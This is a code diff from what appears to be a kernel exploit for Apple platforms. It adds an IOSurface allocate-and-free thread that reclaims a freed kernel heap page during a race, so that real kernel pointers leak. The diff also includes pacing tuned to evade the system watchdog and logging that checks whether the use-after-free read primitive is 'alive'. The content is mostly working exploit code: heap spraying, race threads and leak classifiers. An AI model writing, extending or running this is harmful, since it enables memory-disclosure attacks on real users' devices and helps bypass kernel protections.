@@ -154,7 +154,7 @@ static volatile uint64_t rc_sprayFrees = 0;
 
 static void *rc_swap_thread(void *arg) {
     (void)arg;
-    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);   /* 2026-11-19: never INTERACTIVE */
     while (!rc_started);
     while (rc_go) {
         while (!rc_raceOn && rc_go);
@@ -178,6 +178,42 @@ static void *rc_swap_thread(void *arg) {
    0 = cleared; -1 = stalled (sets rc_swap_dead — stop racing this boot). */
 static volatile int rc_swap_dead = 0;
 static int g_rcSwapRearmed = 0;
+/* 2026-11-19 IOSURFACE churn (receipt-backed: the p159 anchors ARE
+   IOSurface-adjacency kernel heap VAs — churn the SAME object family so
+   the freed window gets recycled by an IOSurface kernel object whose OWN
+   fields are genuine kernel pointers. Our sprayed anchor values stay
+   classifier-excluded; the object's kptrs count as real disclosures.)
+   UTILITY QoS + 25 ms pacing = no watchdog class. */
+static volatile int rc_surfChurnGo = 0;
+static void rc_log(const char *fmt, ...);   /* fwd decl — rc_log defined below */
+typedef IOSurfaceRef (*rc_surf_create_t)(CFDictionaryRef);
+static void *rc_surf_churn_thread(void *arg) {
+    (void)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_UTILITY, 0);
+    rc_surf_create_t pCr = (rc_surf_create_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    if (!pCr) { rc_log("[v14] IOSurface churn: dlsym failed — thread idle"); return NULL; }
+    int32_t w = 64, h = 64, bpe = 4;
+    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
+    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
+    CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
+    const void *ck[3] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"), CFSTR("IOSurfaceBytesPerElement") };
+    const void *cv[3] = { nw, nh, nb };
+    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, ck, cv, 3,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFRelease(nw); CFRelease(nh); CFRelease(nb);
+    uint64_t cycles = 0;
+    while (rc_surfChurnGo) {
+        for (int i = 0; i < 8 && rc_surfChurnGo; i++) {
+            IOSurfaceRef s = pCr(props);
+            if (s) CFRelease(s);   /* alloc+free draw on the freed page */
+            cycles++;
+        }
+        usleep(25000);   /* 25 ms pacing — the watchdog law */
+    }
+    if (props) CFRelease(props);
+    rc_log("[v14] IOSurface churn stopped (cycles=%llu)", (unsigned long long)cycles);
+    return NULL;
+}
 /* 2026-11-19 multi-anchor: the full same-boot set (m0 = [0]; the v14
    reclaim spray carries [1]). Classifiers exclude the whole set. */
 static uint64_t g_rcAnchors[4] = {0};
@@ -1572,6 +1608,11 @@ static CFNumberRef RCNUM(int64_t v) {
         if (pthread_create(&thSpray2, NULL, rc_socket_spray_thread, NULL) == 0)
             rc_log("[v14] kernel-side socket churn live for the reclaim windows");
         else { rc_sprayGo = 0; rc_log("[v14] spray re-arm failed — reclaim runs without kernel churn (honest)"); }
+        pthread_t thSurf2 = 0;
+        rc_surfChurnGo = 1;
+        if (pthread_create(&thSurf2, NULL, rc_surf_churn_thread, NULL) == 0)
+            rc_log("[v14] IOSurface churn live (p159-family objects, 25 ms pacing)");
+        else { rc_surfChurnGo = 0; thSurf2 = 0; }
         for (uint32_t ci = 0; ci < cand14N; ci++) {
             if (rc_swap_dead) break;
             uint64_t off = cand14[ci];
@@ -1667,9 +1708,11 @@ static CFNumberRef RCNUM(int64_t v) {
             LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                 LABB_SIG_FOREIGN, LABB_E_DEVICE, fe14, 2);
         }
-        /* stop the kernel-side churner before teardown */
+        /* stop the kernel-side churners before teardown */
         rc_sprayGo = 0;
+        rc_surfChurnGo = 0;
         if (thSpray2) pthread_join(thSpray2, NULL);
+        if (thSurf2) pthread_join(thSurf2, NULL);
     }
 
     rc_log("READ: WRONG/FOREIGN on either path = primitive alive.");
